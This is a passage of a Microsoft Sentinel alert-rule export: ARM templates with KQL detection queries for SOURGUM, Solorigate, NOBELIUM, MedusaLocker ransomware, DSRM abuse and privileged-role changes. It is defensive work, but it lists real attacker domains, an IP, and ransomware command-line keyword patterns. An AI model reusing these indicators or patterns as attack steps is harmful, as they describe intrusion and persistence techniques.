          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5c243cb3-9f13-4cac-95af-3d0d28a4530e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5c243cb3-9f13-4cac-95af-3d0d28a4530e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SOURGUM Actor IOC - July 2021",
          "description": "Identifies a match across IOC's related to an actor tracked by Microsoft as SOURGUM",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/SOURGUM.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet domains = (iocs | where Type =~ \"domainname\"| project IoC);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\nlet file_path1 = (iocs | where Type =~ \"filepath1\" | project IoC);\nlet file_path2 = (iocs | where Type =~ \"filepath2\" | project IoC);\nlet file_path3 = (iocs | where Type =~ \"filepath3\" | project IoC);\nlet reg_key = (iocs | where Type =~ \"regkey\" | project IoC);\nWindowsEvent\n| where EventID == 4688 and (EventData has_any (file_path1) or EventData has_any (file_path2) or  EventData has_any (file_path3) or EventData has_any ('reg add') or EventData has_any (reg_key) )\n| extend CommandLine = tostring(EventData.CommandLine)\n| extend NewProcessName = tostring(EventData.NewProcessName)\n| extend ParentProcessName = tostring(EventData.ParentProcessName)\n| where (CommandLine has_any (file_path1)) or\n  (CommandLine has_any (file_path3)) or\n  (CommandLine has 'reg add' and CommandLine has_any (reg_key) and CommandLine has_any (file_path2)) or \n  (NewProcessName has_any (file_path1)) or\n  (NewProcessName has_any (file_path3)) or\n  (ParentProcessName has_any (file_path1)) or \n  (ParentProcessName has_any (file_path3)) \n| extend Account = strcat(EventData.SubjectDomainName,\"\\\\\", EventData.SubjectUserName)\n| extend NewProcessId = tostring(EventData.NewProcessId)\n| extend IPCustomEntity = tostring(EventData.IpAddress)\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type, IPCustomEntity\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName, Alert = 'SOURGUM IOC detected'",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1546"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "066395ac-ef91-4993-8bf6-25c61ab0ca5a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/29adbe2c-05cc-4e45-9dc5-a288140b3d7c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/29adbe2c-05cc-4e45-9dc5-a288140b3d7c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Defender for Office 365 alerts",
          "description": "Create incidents based on all alerts generated in Microsoft Defender for Office 365",
          "enabled": true,
          "productFilter": "Office 365 Advanced Threat Protection",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "ee1d718b-9ed9-4a71-90cd-a483a4f008df"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/13670554-fe01-4ce3-b9cb-8ea258112c09')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/13670554-fe01-4ce3-b9cb-8ea258112c09')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Solorigate Named Pipe",
          "description": "Identifies a match across various data feeds for named pipe IOCs related to the Solorigate incident.\n For the sysmon events required for this detection, logging for Named Pipe Events needs to be configured in Sysmon config (Event ID 17 and Event ID 18)\n Reference: https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095",
          "severity": "High",
          "enabled": true,
          "query": "(union isfuzzy=true\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID in (17,18)\n| where EventData has '583da945-62af-10e8-4902-a8f205c72b2e'\n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key = tostring(column_ifexists('@Name', \"\")), Value = column_ifexists('#text', \"\")\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, EventID, UserName, MG, ManagementGroupName, _ResourceId)\n| extend PipeName = column_ifexists(\"PipeName\", \"\")\n| extend Account = UserName\n),\n(\nSecurityEvent\n| where EventID == '5145'\n// %%4418 looks for presence of CreatePipeInstance value \n| where AccessList has '%%4418'     \n| where RelativeTargetName has '583da945-62af-10e8-4902-a8f205c72b2e'\n),\n(\nWindowsEvent\n| where EventID == '5145' and EventData has '%%4418'  and EventData has '583da945-62af-10e8-4902-a8f205c72b2e' \n// %%4418 looks for presence of CreatePipeInstance value \n| extend AccessList= tostring(EventData.AccessList)\n| where AccessList has '%%4418'     \n| extend RelativeTargetName= tostring(EventData.RelativeTargetName)\n| where RelativeTargetName has '583da945-62af-10e8-4902-a8f205c72b2e'\n| extend Account =  strcat(tostring(EventData.SubjectDomainName),\"\\\\\", tostring(EventData.SubjectUserName))\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1055"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "11b4c19d-2a79-4da3-af38-b067e1273dee",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/14146382-cec3-4b1c-9c27-187023338f51')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/14146382-cec3-4b1c-9c27-187023338f51')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Service Principal Assigned Privileged Role",
          "description": "Detects a privileged role being added to a Service Principal.\n  Ensure that any assignment to a Service Principal is valid and appropriate - Service Principals should not be assigned to very highly privileged roles such as Global Admin.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts",
          "severity": "Medium",
          "enabled": true,
          "query": "AuditLogs\n  | where OperationName has_all (\"member to role\", \"add\")\n  | where Result =~ \"Success\"\n  | extend type_ = tostring(TargetResources[0].type)\n  | where type_ =~ \"ServicePrincipal\"\n  | where isnotempty(TargetResources)\n  | extend ServicePrincipal = tostring(TargetResources[0].displayName)\n  | extend SPID = tostring(TargetResources[0].id)\n  | mv-expand TargetResources[0].modifiedProperties\n  | extend TargetResources_0_modifiedProperties = columnifexists(\"TargetResources_0_modifiedProperties\", '')\n  | where isnotempty(TargetResources_0_modifiedProperties)\n  | where TargetResources_0_modifiedProperties.displayName =~ \"Role.DisplayName\"\n  | extend TargetRole = parse_json(tostring(TargetResources_0_modifiedProperties.newValue))\n  | where TargetRole contains \"admin\"\n  | extend AddedByApp = iif(\n  isnotempty(tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName)),\n  tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName),\n  tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n  )\n  | extend AddedByUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend AddedBy = iif(isnotempty(AddedByApp), AddedByApp, AddedByUser)\n  | extend IpAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | project-reorder TimeGenerated, ServicePrincipal, SPID, TargetRole, AddedBy, IpAddress\n  | project-away AddedByApp, AddedByUser",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "84cccc86-5c11-4b3a-aca6-7c8f738ed0f7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "SPID"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AddedBy"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8bc475e8-b6d2-40c4-b74a-49f88dacea6c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8bc475e8-b6d2-40c4-b74a-49f88dacea6c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SOCP-ossible MedusaLocker Ransomware Execution with PowerShell Script in Text File",
          "description": "",
          "severity": "High",
          "enabled": true,
          "query": "SecurityEvent |  where EventID == 4688 | where (CommandLine contains 'sc' and CommandLine contains 'create' and CommandLine contains 'purebackup' and CommandLine contains 'powershell.exe' and CommandLine contains 'ReadAllText' and CommandLine contains '.txt')",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/474ab997-00a6-4a33-9472-fc203720c6f0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/474ab997-00a6-4a33-9472-fc203720c6f0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DSRM Account Abuse",
          "description": "This query detects an abuse of the DSRM account in order to maintain persistence and access to the organization's Active Directory.\nRef: https://adsecurity.org/?p=1785",
          "severity": "High",
          "enabled": true,
          "query": "Event\n| where EventLog == \"Microsoft-Windows-Sysmon/Operational\" and EventID in (13)\n| parse EventData with * 'TargetObject\">' TargetObject \"<\" * 'Details\">' Details \"<\" * \n| where TargetObject has (\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\") and Details == \"DWORD (0x00000002)\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by EventID, Computer,  TargetObject, Details",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "979c42dd-533e-4ede-b18b-31a84ba8b3d6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "RegistryKey",
              "fieldMappings": [
                {
                  "identifier": "Key",
                  "columnName": "TargetObject"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/29d153b5-c372-4983-a52b-089495355e03')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/29d153b5-c372-4983-a52b-089495355e03')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NOBELIUM - Domain and IP IOCs - March 2021",
          "description": "Identifies a match across various data feeds for domains and IP IOCs related to NOBELIUM.\n References: https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/",
          "severity": "Medium",
          "enabled": true,
          "query": "let DomainNames = dynamic(['onetechcompany.com', 'reyweb.com', 'srfnetwork.org', 'sense4baby.fr', 'nikeoutletinc.org', 'megatoolkit.com']);\nlet IPList = dynamic(['185.225.69.69']);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (IPList) or DestinationIP in (IPList) or DestinationHostName in~ (DomainNames) or RequestURL has_any (DomainNames) or Message has_any (IPList)\n| parse Message with * '(' DNSName ')' * \n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", RequestURL in (DomainNames), \"RequestUrl\", \"NoMatch\") \n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, \"NoMatch\"), AccountCustomEntity = SourceUserID\n),\n(_Im_Dns (domain_has_any=DomainNames)\n| extend DestinationIPAddress = DnsResponseName, DNSName = DnsQuery, Host = Dvc\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host\n),\n(_Im_Dns (response_has_any_prefix=IPList)\n| extend DestinationIPAddress = DnsResponseName, DNSName = DnsQuery, Host = Dvc\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host\n),\n(_Im_WebSession(url_has_any=DomainNames)\n| extend DestinationIPAddress = DstIpAddr, DNSName = tostring(parse_url(Url)[\"Host\"]), Host = Dvc\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host\n),\n(VMConnection\n| where SourceIp in (IPList) or DestinationIp in (IPList) or RemoteDnsCanonicalNames has_any (DomainNames)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| extend IPMatch = case( SourceIp in (IPList), \"SourceIP\", DestinationIp in (IPList), \"DestinationIP\", \"None\") \n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"NoMatch\"), HostCustomEntity = Computer\n),\n(OfficeActivity\n| where ClientIP in (IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = ClientIP, AccountCustomEntity = UserId\n),\n(DeviceNetworkEvents\n| where RemoteUrl has_any (DomainNames) or RemoteIP in (IPList)\n| extend timestamp = TimeGenerated, DNSName = RemoteUrl, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (DomainNames)  \n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1102"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "bb8a3481-dd14-4e76-8dcc-bbec8776d695",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "DNS",
              "fieldMappings": [
                {
                  "identifier": "DomainName",
                  "columnName": "DNSName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.3.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2911')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2911')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2911: [Custom] MDE - Detection Of USB Drive Write Activities",
          "description": "This rule identifies USB drive write activities (File Creation and Modification Events) which may be an indicator of data exfiltration or malware replication activities. MITRE: T1091,T1025 Category: Defender for Endpoints tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 0h;      \nlet end_time = now();\nlet start_time_historical = 1d;  \nlet USBMountEvent = materialize(DeviceEvents\n|where TimeGenerated between (ago(start_time_historical) .. ago(start_time))\n| where ActionType =~ 'UsbDriveMounted'\n| extend DriveLetter = parse_json(AdditionalFields).DriveLetter,\n    Manufacturer = parse_json(AdditionalFields).Manufacturer,\n    ProductName = parse_json(AdditionalFields).ProductName,\n    SerialNumber = parse_json(AdditionalFields).SerialNumber\n| summarize DriveMountTime = max(TimeGenerated) by DeviceName, tostring(DriveLetter), tostring(Manufacturer), tostring(ProductName), tostring(SerialNumber));\nDeviceFileEvents\n| where TimeGenerated between (ago(start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ActionType in ('FileCreated', 'FileModified')\n| extend DriveLetter = tostring(extract('^(\\\\D:)', 1, FolderPath))\n| where DeviceName in ((USBMountEvent\n| project DeviceName)) and DriveLetter in ((USBMountEvent\n| project DriveLetter))\n| summarize FileCount = count(), FirstFileEvent = min(TimeGenerated), LastFileEvent = max(TimeGenerated), FilesList = make_list(FolderPath, 500) by DeviceName, DriveLetter, ActionType\n| join kind=inner (USBMountEvent) on DriveLetter, DeviceName\n| extend AttackerEntity = array_concat(pack_array(DeviceName))\n| extend ExtendedDescription = strcat('File write activities detected on host ', DeviceName, ' from USB drive ', DriveLetter)\n| project \n    DeviceName\n    , DriveLetter\n    , Manufacturer\n    , ProductName\n    , SerialNumber\n    , FileCount\n    , ActionType\n    , DriveMountTime\n    , FirstFileEvent\n    , LastFileEvent\n    , FilesList\n    , AttackerEntity\n    , RBAScore=1\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1091",
            "T1025"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This rule identifies USB drive write activities (File Creation and Modification Events) which may be an indicator of data exfiltration or malware replication activities.\n{{ExtendedDescription}}\ntag: Custom\nCategory: Defender for Endpoints\nMITRE: T1091 MITRE: T1025         "
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2900')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2900')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2900: [Custom] Windows - Non-conforming Account Name in Monitored group",
          "description": "The rule alerts when a username not fitting a specific pattern is added to a specified AD group MITRE: T1098 Category: Windows Security tag: Custom",
          "severity": "Informational",
          "enabled": false,
          "query": "let EventIDList = dynamic(['4728', '4732', '4756']);     \nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where AccountType =~ 'User'\n| join kind=leftouter A2900_GROUP_USER on $left.TargetUserName == $right.GroupName\n|where isnotempty(AllowedNames)\n| where tolower(MemberName) !contains AllowedNames\n| extend EventID = tostring(EventID)\n| extend AttackerEntity = pack_array(SubjectUserName, MemberName)\n| extend ExtendedDescription = strcat('Admin account ', SubjectUserName, ' added user account ', MemberName, ' to restricted active directory group ' , TargetUserName)\n| project  TimeGenerated, ExtendedDescription, Computer, AttackerEntity,EventID, Activity, TargetUserName, SubjectAccount, SubjectUserName, MemberName,AllowedNames",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "The rule alerts when a username not fitting a specific pattern is added to a specified AD group\n{{ExtendedDescription}}\ntag: Custom\nCategory: Windows Security\nMITRE: T1098"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "MemberName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1617')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1617')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1617: [Custom] MDE - Remote Desktop Protocol Enabled",
          "description": "This rule identifies any system that remote desktop protocol is enabled on. MITRE: T1021 Category: Defender for Endpoints tag: Custom",
          "severity": "Low",
          "enabled": false,
